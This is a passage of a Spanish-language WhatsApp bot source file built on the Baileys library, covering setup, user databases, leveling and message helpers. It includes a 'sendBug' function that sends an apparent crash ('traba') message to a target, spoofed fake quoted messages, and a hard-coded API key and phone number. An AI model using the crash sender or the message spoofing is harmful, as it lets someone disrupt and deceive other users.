//ZBOT
const {
    WAConnection: _WAConnection,
    MessageType,
    Presence,
    Mimetype,
    MimetypeMap,
    ChatModification,
    GroupSettingChange,
    MessageOptions,
    WALocationMessage,
    ReconnectMode,
    ProxyAgent,
    waChatKey,
    mentionedJid,
    processTime,
    whatsappID,
    relayWAMessage,
    WA_MESSAGE_STUB_TYPES,
    WA_DEFAULT_EPHEMERAL
} = require('@adiwajshing/baileys');
const simple = require("./libreria/simple.js");
//=====================UwU========================//
const { eng, ind, esp, ptg} = require('./libreria/lenguajes/nexo');
//------------⚡---------------//
const idiomas = esp //Remplaza por tu idioma(esp), Replace with your language(eng), Ganti dengan bahasa Anda(ind), substitua pelo seu idioma(ptg)
//------------⚡-------------//
const { fetchJson, getBase64, kyun, createExif } = require("./libreria/fetcher");
const { color, bgcolor } = require("./libreria/color");
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close, pickRandom, convertSticker } = require("./libreria/functions");
const { addBanned, unBanned, BannedExpired, cekBannedUser } = require('./libreria/banned.js');
const { modokuaker } = require('./libreria/modokuaker');
//=====================UwU========================//
const hx = require("hxz-api");
const fs = require("fs");
const axios = require("axios");
const crypto = require('crypto');
const webp = require('webp-converter');
const webp2 = require('node-webpmux');
const request = require("request");
const moment = require("moment-timezone");
const util = require('util');
const { promisify } = require('util');
const mime = require('mime-types');
const { spawn, exec, execSync } = require("child_process");
const fetch = require("node-fetch");
const ffmpeg = require("fluent-ffmpeg");
const google = require('google-it');
const base64Img = require('base64-img');
const chalk = require('chalk')
const imageToBase64 = require('image-to-base64')
const speed = require("performance-now");
const Mms = require('parse-ms'); //1
const imgbb = require('imgbb-uploader');
const { removeBackgroundFromImageFile } = require('remove.bg');
const path = require('path');
const imgugul = require('g-i-s');
const ms = require("pretty-ms");
const { webp2gifFile, igDownloader, TiktokDownloader, igdl, zenmediafire} = require("./libreria/downloader.js")
const os = require('os');
const yts = require("yt-search");
const { webp2mp4File } = require("./libreria/webp2mp4");
const { wikipedia } = require('./libreria/wikipedia.js');
const { validmove, setGame } = require("./libreria/tictactoe");
const zalgo = require('./libreria/zalgo');
const { jadibot, stopjadibot, listjadibot } = require("./libreria/jadibot");


//=====================UwU========================//
const _limit = JSON.parse(fs.readFileSync('./basededatos/json/limit.json'));
const _registered = JSON.parse(fs.readFileSync('./basededatos/usuariosnius/registered.json'));
//=====================UwU========================//
const _antifakes = JSON.parse(fs.readFileSync('./basededatos/json/antifakes.json'));
const _estranjerosnot = JSON.parse(fs.readFileSync('./basededatos/json/estranjerosnot.json'));
const welkom = JSON.parse(fs.readFileSync('./basededatos/json/welkom.json'));
const _nsfw = JSON.parse(fs.readFileSync('./basededatos/json/nsfw.json'))
const _anime = JSON.parse(fs.readFileSync('./basededatos/json/anime.json'));
const _diversion = JSON.parse(fs.readFileSync('./basededatos/json/modofull.json'));
const badword = JSON.parse(fs.readFileSync('./basededatos/json/badword.json'));
const blocked = JSON.parse(fs.readFileSync('./basededatos/json/blocked.json'));
const _ban = JSON.parse(fs.readFileSync('./basededatos/json/baneados.json'));
const _chatban = JSON.parse(fs.readFileSync('./basededatos/json/ban.json'));
const _antilink = JSON.parse(fs.readFileSync("./basededatos/json/antilink.json"));
const _antilinkuwu = JSON.parse(fs.readFileSync('./basededatos/json/antilink2.json'));
//nivel :v
const _leveling = JSON.parse(fs.readFileSync('./basededatos/json/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./basededatos/json/level.json'))
//Podes incorporar tu propio antitraba :3
const { kuakerzzz } = require('./basededatos/uwudefender/destravasimple')
//ajustes (editable) 7v7
const ajustes = JSON.parse(fs.readFileSync('./informacion.json'))
const ownerNumber1 = ajustes.BotControlador
const nombrecontact = ajustes.CoCreador
const contacto01 = ajustes.VCardX
const contacto1 = ajustes.VCardY
const namebotuwu = ajustes.NombreBot
const memberLimit = ajustes.LimiteEnGrupos
const limitt = ajustes.LimiteComandos
const promocionar = ajustes.TusRedesSociales
const mypaisnum = ajustes.MyPais
//apis :v
const lolhumankey = ajustes.ApiLoL;
const lolhuman = ajustes.ApiLoL;
const zeks = ajustes.ApiZeks;
//=====================UwU========================//
prefix = ajustes.prefijo
NK_Tesla = true
OnOffLine = true
antidel = false
saludoc = true
hit_today = []
imgb = '63ccbd372f6b4d2c84e52ebe93394052'
var MyThumb = fs.readFileSync('./multimedia/imagenes/milogohd.jpg')
//Tarjera de virtual telefonico
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + 'FN:Matt M.\n'
            + 'ORG:Otakus Tecnologicos;\n'
            + 'TEL;type=CELL;type=VOICE;waid=+51995386439:+51 995 386 439\n'
            + 'END:VCARD'
       
const vcard1 = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nombrecontact}\n`
            + 'ORG:NeKosmic ✓;\n'
            + `TEL;type=CELL;type=VOICE;waid=${contacto1}:${contacto01}\n`
            + 'END:VCARD'

/****** FUNCIONES REQUERIDAS ******/
const getRegisteredRandomId = () => {
  return _registered[Math.floor(Math.random() * _registered.length)].id
}

const addRegisteredUser = (userid, sender, age, time, serials) => {
  const obj = {
id: userid,
name: sender,
age: age,
time: time,
serial: serials
  }
  _registered.push(obj)
  fs.writeFileSync('./basededatos/usuariosnius/registered.json', JSON.stringify(_registered))
}

const createSerial = (size) => {
  return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const checkRegisteredUser = (sender) => {
  let status = false
  Object.keys(_registered).forEach((i) => {
if (_registered[i].id === sender) {
  status = true
}
  })
  return status
}
///Json
//=====================UwU========================//
function monospace(string) {
return '```' + string + '```'
}   

/**FECHA DET**/
var date = new Date();

var tahun = date.getFullYear();

var bulan = date.getMonth();
var MEZ = date.getMonth();
var tanggal = date.getDate();
var hari = date.getDay();

var jams = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();

var horas1 = date.getHours();
var minutos1 = date.getMinutes();
var segundos1 = date.getSeconds();

switch(hari) {
 case 0: hari = "Domingo"; break;
 case 1: hari = "Lunes"; break;
 case 2: hari = "Martes"; break;
 case 3: hari = "Miercoles"; break;
 case 4: hari = "Jueves"; break;
 case 5: hari = "Viernes"; break;
 case 6: hari = "Sabado"; break;
}
switch(bulan) {
 case 0: bulan = "De Enero Del"; break;
 case 1: bulan = "De Febrero Del"; break;
 case 2: bulan = "De Marzo Del"; break;
 case 3: bulan = "De Abril Del"; break;
 case 4: bulan = "De Mayo Del"; break;
 case 5: bulan = "De Junio Del"; break;
 case 6: bulan = "De Julio Del"; break;
 case 7: bulan = "De Agosto Del"; break;
 case 8: bulan = "De Septiembre Del"; break;
 case 9: bulan = "De Octubre Del"; break;
 case 10: bulan = "De Noviembre Del"; break;
 case 11: bulan = "De Diciembre Del"; break;
}
switch(MEZ) {
 case 0: MEZ = "0"; break;
 case 1: MEZ = "1"; break;
 case 2: MEZ = "2"; break;
 case 3: MEZ = "3"; break;
 case 4: MEZ = "4"; break;
 case 5: MEZ = "5"; break;
 case 6: MEZ = "6"; break;
 case 7: MEZ = "7"; break;
 case 8: MEZ = "8"; break;
 case 9: MEZ = "9"; break;
 case 10: MEZ = "10"; break;
 case 11: MEZ = "11"; break;
}
switch(jams){
case 0: jams = "Buena Madrugada "; break;
case 1: jams = "Buena Madrugada "; break;
case 2: jams = "Buena Madrugada "; break;
case 3: jams = "Buenos Dias "; break;
case 4: jams = "Buenos Dias "; break;
case 5: jams = "Buenos Dias "; break;
case 6: jams = "Buenos Dias!!! "; break;
case 7: jams = "Que tengas un excelente dia "; break;
case 8: jams = "Que tengas un excelente dia "; break;
case 9: jams = "Que tengas un excelente dia "; break;
case 10: jams = "Que tengas un excelente dia "; break;
case 11: jams = "Buen dia "; break;
case 12: jams = "Buen dia "; break;
case 13: jams = "Buen dia "; break;
case 14: jams = "Buenas Tardes "; break;
case 15: jams = "Buenas Tardes "; break;
case 16: jams = "Buenas Tardes "; break;
case 17: jams = "Buenas Tardes "; break;
case 18: jams = "Buenas Tardes "; break;
case 19: jams = "Buenas Tardes "; break;
case 20: jams = "Buenas Noches "; break;
case 21: jams = "Buenas Noches "; break;
case 22: jams = "Buenas Noches "; break;
case 23: jams = "Buenas Noches "; break;
            }
            
var tampilTanggal = hari + " "+ tanggal + " " + bulan + " " + tahun;
var tampilWaktu2 = horas1 + " : " + minutos1 + " : " + segundos1;
var tampilWaktuwu = jams;
var fechaAC = tanggal + "/"+ MEZ + "/" + tahun;

//=====================UwU========================//

module.exports = teslagod = async (teslagod, mek) => {
  try {
    if (!mek.hasNewMessage) return;
    mek = mek.messages.all()[0];
    if (!mek.message) return;
    if (mek.key && mek.key.remoteJid == "status@broadcast") return;
    global.blocked
	global.prefix
    mek.message =
      Object.keys(mek.message)[0] === "ephemeralMessage"
        ? mek.message.ephemeralMessage.message
        : mek.message;
    const from = mek.key.remoteJid;
    const content = JSON.stringify(mek.message);
    const type = Object.keys(mek.message)[0]
    const { text, extendedText, contact, location, contactsArray, liveLocation, image, video, sticker, document, audio, product } = MessageType;
    const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
    const typeQuoted = Object.keys(quoted)[0]
    const chats = (type === 'chat') ? body : (type === 'image' || type === 'video') ? caption : ''
    const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
    var Link = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
    const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
    const m = simple.smsg(teslagod, mek);
    const body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : ''
    const automensajesxd = Link.slice(0).trim().split(/ +/).shift().toLowerCase()
    const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
    const rtpuwu = budy.slice(0).trim().split(/ +/).shift().toLowerCase()
    const args = body.trim().split(/ +/).slice(1)
    const UwU = args.join(' ')
    const txt = mek.message.conversation
    const isCmd = body.startsWith(prefix)
    const brody = mek.message.conversation || mek.message[type].caption || mek.message[type].text || ""
    const argss = brody.split(/ +/g)
    const arg = body.substring(body.indexOf(' ') + 1)
    const time = moment().tz('America/Lima').format('DD/MM HH:mm:ss');
    const fechamex = moment().tz('America/Mexico_City').format('DD/MM HH:mm:ss')
    const fechabol = moment().tz('America/La_Paz').format('DD/MM HH:mm:ss')
    const fechachi = moment().tz('America/Santiago').format('DD/MM HH:mm:ss')
    const fechaarg = moment().tz('America/Argentina/Buenos_Aires').format('DD/MM HH:mm:ss')
    const fechacol = moment().tz('America/Bogota').format('DD/MM HH:mm:ss')
    const fechaecu = moment().tz('America/Guayaquil').format('DD/MM HH:mm:ss')
    const fechacosr = moment().tz('America/Costa_Rica').format('DD/MM HH:mm:ss')
    const fechacub = moment().tz('America/Havana').format('DD/MM HH:mm:ss')
    const fechagua = moment().tz('America/Guatemala').format('DD/MM HH:mm:ss')
    const fechahon = moment().tz('America/Tegucigalpa').format('DD/MM HH:mm:ss')
    const fechanic = moment().tz('America/Managua').format('DD/MM HH:mm:ss')
    const fechapan = moment().tz('America/Panama').format('DD/MM HH:mm:ss')
    const fechauru = moment().tz('America/Montevideo').format('DD/MM HH:mm:ss')
    const fechaven = moment().tz('America/Caracas').format('DD/MM HH:mm:ss')
    const fechapar = moment().tz('America/Asuncion').format('DD/MM HH:mm:ss')
    const fechanew = moment().tz('America/New_York').format('DD/MM HH:mm:ss')
    const fechaasi = moment().tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
    const fechabra = moment().tz('America/Sao_Paulo').format('DD/MM HH:mm:ss')
//===================================================//
    const isGroup = from.endsWith("@g.us");
//===================================================//    
    const ownerNumber = [`${ownerNumber1}`]
    const teslauser = ["51995386439@s.whatsapp.net"]
    const sender = isGroup ? mek.participant : mek.key.remoteJid
    const sender2 = mek.key.fromMe ? teslagod.user.jid : isGroup ? mek.participant : mek.key.remoteJid
    const conts = mek.key.fromMe ? teslagod.user.jid : teslagod.contacts[sender] || { notify: jid.replace(/@.+/, "") };
    const pushname = mek.key.fromMe ? teslagod.user.name : conts.notify || conts.vname || conts.name || "A/Z";
    const senderNumber = sender.split("@")[0] 
    const SoyYo = teslagod.user.jid;
    const autonomo = mek.key.fromMe
//===================================================//    
    const groupMetadata = isGroup ? await teslagod.groupMetadata(from) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const groupId = isGroup ? groupMetadata.jid : "";
    const groupMembers = isGroup ? groupMetadata.participants : "";
    const groupDesc = isGroup ? groupMetadata.desc : "";
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : "";
    const totalchat = await teslagod.chats.all();
    const isBotGroupAdmins = groupAdmins.includes(SoyYo) || false;
    const isGroupAdmins = groupAdmins.includes(sender) || false;
        const isWelkom = isGroup ? welkom.includes(from) : false
        const isNsfw = isGroup ? _nsfw.includes(from) : false
        const isLevelingOn = isGroup ? _leveling.includes(groupId) : false
        const isAnime = isGroup ? _anime.includes(from) : false
        const isDiversion = isGroup ? _diversion.includes(from) : false
        const isAntiLink = isGroup ? _antilink.includes(from) : false
        const isAntiLinkuwu = isGroup ? _antilinkuwu.includes(from) : false
        const isEstranjeros = isGroup ? _estranjerosnot.includes(from) : false
        const isBadWord = isGroup ? badword.includes(from) : false
        const isAntifakes = isGroup ? _antifakes.includes(from) : false
        const isRegistrado = checkRegisteredUser(sender)
    const Matt_M = ownerNumber.includes(sender)
    const isTeslaUser = teslauser.includes(sender)
    const isBaneado = cekBannedUser(sender, _ban)
    const isBanChat = _chatban.includes(from)
//========================UwU========================//
if (isBanChat && !autonomo && !Matt_M && !isTeslaUser) return
//cmhit.push(command)
//========================UwU========================//
       const sendBug = async(target, teks) => {
           if (!teks) teks = `${modokuaker}`
           await teslagod.relayWAMessage(teslagod.
           prepareMessageFromContent(target, teslagod.
           prepareDisappearingMessageSettingContent(0),
           {}),{waitForAck:true})
           teslagod.sendMessage(target, teks, 'conversation')
        }
        const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = teslagod.user.phone
        const funar = function (from, orangnya) {
      for (let i of orangnya) {
        teslagod.groupRemove(from, [i])}}
        const reply = (teks) => {
         teslagod.sendMessage(from, teks, MessageType.text, {sendEphemeral: true, quoted: mek})
        }
        const sendImage = (teks) => {
		    teslagod.sendMessage(from, teks, image, {quoted:mek})
		}
        const sendMess = (hehe, teks) => {
            teslagod.sendMessage(hehe, teks, text)
        }
        const sendPtt = (teks) => {
		    teslagod.sendMessage(from, audio, mp3, {quoted:mek})
		}
        const mentions = (teks, memberr, id) => {
      id == null || id == undefined || id == false
        ? teslagod.sendMessage(from, teks.trim(), extendedText, {
            contextInfo: { mentionedJid: memberr },
          })
        : teslagod.sendMessage(from, teks.trim(), extendedText, {
            quoted: mek,
            contextInfo: { mentionedJid: memberr },
          });
          }
//========================UwU========================//
    const sendMediaURL = async (to, url, text = "", mids = []) => {
      if (mids.length > 0) {
        text = normalizeMention(to, text, mids);
      }
      const fn = Date.now() / 10000;
      const filename = fn.toString();
      let mime = "";
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          mime = res.headers["content-type"];
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, filename, async function () {
        console.log("done");
        let media = fs.readFileSync(filename);
        let type = mime.split("/")[0] + "Message";
        if (mime === "image/gif") {
          type = MessageType.video;
          mime = Mimetype.gif;
        }
        if (mime.split("/")[0] === "audio") {
          mime = Mimetype.mp4Audio;
        }
        teslagod.sendMessage(to, media, type, {
          quoted: mek,
          mimetype: mime,
          caption: text,
          contextInfo: { mentionedJid: mids },
        });

        fs.unlinkSync(filename);
      });
    };
//========================UwU========================//
const getLevelingXp = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const getLevelingLevel = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }        

        const getLevelingId = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].jid
            }
        }

        const addLevelingXp = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./basededatos/json/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./basededatos/json/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingId = (userId) => {
            const obj = {jid: userId, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./basededatos/json/level.json', JSON.stringify(_level))
        }
        
 //funcion de limite
           const isLimit = (sender) =>{
                      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
                let limits = i.limit
              if (limits >= limitt ) {
                  position = true
                    teslagod.sendMessage(from, limitend(pushname), text, {quoted: mek})
                    return true
              } else {
                _limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
                const obj = { id: sender, limit: 1 }
                _limit.push(obj)
                fs.writeFileSync('./basededatos/json/limit.json',JSON.stringify(_limit))
           return false
       }
     }
        const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./basededatos/json/limit.json', JSON.stringify(_limit))
            }
        }
//========================UwU========================//
const miniaturaNK = (teks, yes) => {
            teslagod.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./multimedia/imagenes/milogo.jpg'),quoted:mek,caption:yes})
            }
//========================UwU========================//
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
teslagod.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
//========================UwU========================//
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await teslagod.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
teslagod.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//========================UwU========================//
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await teslagod.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
teslagod.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//========================UwU========================//
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await teslagod.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
teslagod.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//========================UwU========================//
const fakethumb = (teks, yes) => {
teslagod.sendMessage(from, teks, image, {thumbnail: fs.readFileSync("./multimedia/imagenes/milogo.jpg"),quoted: mek,caption: yes,})}
//========================UwU========================//
//estado :D
//1
const rptardidos = {
key:{ fromMe: false,participant: `0@s.whatsapp.net`, ...(from ?{ remoteJid: "status@broadcast" } : {}) },message: { "imageMessage": { "mimetype": "image/jpeg","caption": `${pushname}`, 'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/logouwur.jpg')}}}
contextInfo: {mentionedJid: [sender]}
//2
const estadouwur1 = {
key:{ fromMe: false,participant: `0@s.whatsapp.net`, ...(from ?{ remoteJid: "status@broadcast" } : {}) },message: { "imageMessage": { "mimetype": "image/jpeg","caption": `${namebotuwu} ᴮʸ⁻ᴺᴷ`, 'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/logouwur.jpg')}}}
contextInfo: {mentionedJid: [sender]}
//3
const cuestionuwu = {
key:{ fromMe: false,participant: `0@s.whatsapp.net`, ...(from ?{ remoteJid: "status@broadcast" } : {}) },message: { "imageMessage": { "mimetype": "image/jpeg","caption": `${pushname}?`, 'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/ajammm.jpg')}}}
contextInfo: {mentionedJid: [sender]}
//4
const PressF = {
key:{ fromMe: false,participant: `0@s.whatsapp.net`, ...(from ?{ remoteJid: "status@broadcast" } : {}) },message: { "imageMessage": { "mimetype": "image/jpeg","caption": `San-Pedro c llevo a ${pushname}`, 'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/sanpedro.jpg')}}}
contextInfo: {mentionedJid: [sender]}
//4.5
const RiukF = {
key:{ fromMe: false,participant: `0@s.whatsapp.net`, ...(from ?{ remoteJid: "status@broadcast" } : {}) },message: { "imageMessage": { "mimetype": "image/jpeg","caption": `C come una manzana* UwU`, 'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/sanpedro.jpg')}}}
contextInfo: {mentionedJid: [sender]}
//5
const audiowo = {
key:{ fromMe: false,participant: `0@s.whatsapp.net`, ...(from ?{ remoteJid: "status@broadcast" } : {}) },message: { "audioMessage": { "caption":`${namebotuwu} ᴮʸ⁻ᴺᴷ`, 'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/audiqwq.jpeg')}}}
contextInfo: {mentionedJid: [sender]}
//6
const audiowor = {
key:{ fromMe: false,participant: `0@s.whatsapp.net`, ...(from ?{ remoteJid: "status@broadcast" } : {}) },message: { "audioMessage": {"mimetype": "audio/mp4", "ptt": true, "seconds": -51995386439}}}
contextInfo: {mentionedJid: [sender]}
//7
const estarder = {
key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 737,status: 1,surface : 1,message: tampilWaktuwu + `\n${pushname}\n`,orderTitle: 'UwU',thumbnail: fs.readFileSync('./multimedia/imagenes/logouwur.jpg'), sellerJid: '0@s.whatsapp.net'}}}
//8
const nsfwmek = { key : {fromMe: false,participant : "0@s.whatsapp.net", ...(from ? { remoteJid: "51995386439-1624232428@g.us" } : {})},message: {orderMessage: {itemCount : 69,status: 1,surface : 1,message: `Marrano-Kun 🥵`,orderTitle: 'Matt_M',sellerJid: `${namebotuwu} ᴮʸ⁻ᴺᴷ`,thumbnail: fs.readFileSync('./multimedia/imagenes/nsfw.jpg')}}}
//9
const imagmek = { key : {fromMe: false,participant : "0@s.whatsapp.net", ...(from ? { remoteJid: "51995386439-1624232428@g.us" } : {})},message: {orderMessage: {itemCount : 737,status: 1,surface : 1,message: `Oni-Chan UwU`,orderTitle: 'Matt_M',sellerJid: `${namebotuwu} ᴮʸ⁻ᴺᴷ`,thumbnail: fs.readFileSync('./multimedia/imagenes/imag.jpg')}}}
//10
const creartmek = { key : {fromMe: false,participant : "0@s.whatsapp.net", ...(from ? { remoteJid: "51995386439-1624232428@g.us" } : {})},message: {orderMessage: {itemCount : 707,status: 1,surface : 1,message: `Imaginiza nwn ☯️`,orderTitle: 'Matt_M',sellerJid: `${namebotuwu} ᴮʸ⁻ᴺᴷ`,thumbnail: fs.readFileSync('./multimedia/imagenes/creart.jpg')}}}
const locmek = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "liveLocationMessage": { "caption":`${namebotuwu} ᴮʸ⁻ᴺᴷ`, 'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/milogo.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
//11
const fspam = {
key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {
"contactMessage": {
"displayName": `${pushname} Por favor no sature al bot ;-;`,
"vcard": 'BEGIN:VCARD\n' +
'Version:3.0\n' +
'TEL;type=CELL;type=VOICE;waid=51995386439:+51995386439\n' +
'item1.X-ABLabel:Celular' +
'END:VCARD'}}}
///reply 2
const reeply = (teks) => {
teslagod.sendMessage(from, teks, text, {quoted:estarder})
}
//========================UwU========================//
const levelRole = getLevelingLevel(sender)
        var role = 'Esclavo Nivel-Ⅰ'
        if (levelRole <= 2) {
            role = 'Esclavo Nivel-Ⅱ'
        } else if (levelRole <= 3) {
            role = 'Esclavo Nivel-Ⅲ'
        } else if (levelRole <= 4) {
            role = 'Esclavo Nivel-Ⅳ'
        } else if (levelRole <= 5) {
            role = 'Esclavo Nivel-Ⅴ'
        } else if (levelRole <= 6) {
            role = 'Novato ✓'
        } else if (levelRole <= 7) {
            role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
        } else if (levelRole <= 8) {
            role = 'Recluta Nivel-Ⅰ'
        } else if (levelRole <= 10) {
            role = 'Recluta Nivel-Ⅱ'
        } else if (levelRole <= 12) {
            role = 'Recluta Nivel-Ⅲ'
        } else if (levelRole <= 14) {
            role = 'Recluta Nivel-Ⅳ'
        } else if (levelRole <= 16) {
            role = 'Recluta Nivel-Ⅴ'
        } else if (levelRole <= 19) {
            role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
        } else if (levelRole <= 20) {
            role = 'Soldado De Primera Clase'
        } else if (levelRole <= 22) {
            role = 'Soladado Con Honores'
        } else if (levelRole <= 25) {
            role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
        } else if (levelRole <= 26) {
            role = 'Especialista'
        } else if (levelRole <= 29) {
            role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
        } else if (levelRole <= 30) {
            role = 'Cabo Sub-1'
        } else if (levelRole <= 32) {
            role = 'Cabo Sub-2'
        } else if (levelRole <= 34) {
            role = 'Cabo Sub-3'
        } else if (levelRole <= 37) {
            role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
        } else if (levelRole <= 38) {
            role = 'Sargento'
        } else if (levelRole <= 40) {
            role = 'Sargento de Segunda Clase'
        } else if (levelRole <= 42) {
            role = 'Sargento de Primera Clase'
        } else if (levelRole <= 44) {
            role = 'Sargento Maestro'
        } else if (levelRole <= 46) {
            role = 'Sargento Primero'
        } else if (levelRole <= 48) {
            role = 'Sargento Mayor'
        } else if (levelRole <= 50) {
            role = 'Sargento Mayor de Comando'
        } else if (levelRole <= 51) {
            role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
        } else if (levelRole <= 52) {
            role = 'Teniente'
        } else if (levelRole <= 54) {
            role = 'Teniente Primero'
        } else if (levelRole <= 57) {
            role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
        } else if (levelRole <= 58) {
            role = 'Capitan'
        } else if (levelRole <= 60) {
            role = 'Capitan Teniente'
        } else if (levelRole <= 63) {
            role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
        } else if (levelRole <= 64) {
            role = 'Mayor'
        } else if (levelRole <= 67) {
            role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
        } else if (levelRole <= 68) {
            role = 'Teniente coronel'
        } else if (levelRole <= 71) {
            role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
        } else if (levelRole <= 72) {
            role = 'Coronel [－]'
        } else if (levelRole <= 74) {
            role = 'Coronel [＝]'
        } else if (levelRole <= 76) {
            role = 'Coronel [≡]'
        } else if (levelRole <= 78) {
            role = 'Coronel [≥]'
        } else if (levelRole <= 80) {
            role = 'Coronel [≧]'
        } else if (levelRole <= 83) {
            role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
        } else if (levelRole <= 84) {
            role = 'General de brigada ㈠'
        } else if (levelRole <= 86) {
            role = 'General de brigada ㈡'
        } else if (levelRole <= 88) {
            role = 'General de brigada ㈢'
        } else if (levelRole <= 91) {
            role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
        } else if (levelRole <= 92) {
